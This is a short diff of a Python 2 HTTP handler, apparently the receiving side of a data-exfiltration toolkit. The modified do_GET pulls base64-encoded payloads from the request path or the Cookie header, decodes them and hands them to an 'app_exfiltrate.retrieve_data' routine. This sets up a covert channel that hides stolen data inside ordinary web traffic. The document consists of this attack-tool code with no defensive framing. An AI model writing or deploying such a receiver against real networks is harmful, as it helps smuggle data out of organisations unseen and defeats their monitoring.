@@ -47,16 +47,26 @@ class S(BaseHTTPRequestHandler):
                 pass
 
     def do_GET(self):
-        self._set_headers()
-        if self.headers.has_key('Cookie'):
-            cookie = self.headers['Cookie']
-            string = cookie.split('=', 1)[1].strip()
+        try:
+            string = '/'.join(self.path.split('/')[1:])
+            self._set_headers()
             try:
                 data = base64.b64decode(string)
-                self.server.handler(data)
+                app_exfiltrate.retrieve_data(data)
             except Exception, e:
-                print e
                 pass
+        except:
+            self._set_headers()
+            if self.headers.has_key('Cookie'):
+                cookie = self.headers['Cookie']
+                string = cookie.split('=', 1)[1].strip()
+                try:
+                    data = base64.b64decode(string)
+                    app_exfiltrate.retrieve_data(data)
+                    self.server.handler(data)
+                except Exception, e:
+                    print e
+                    pass
 
 def send(data):
     if config.has_key('proxies') and config['proxies'] != [""]:
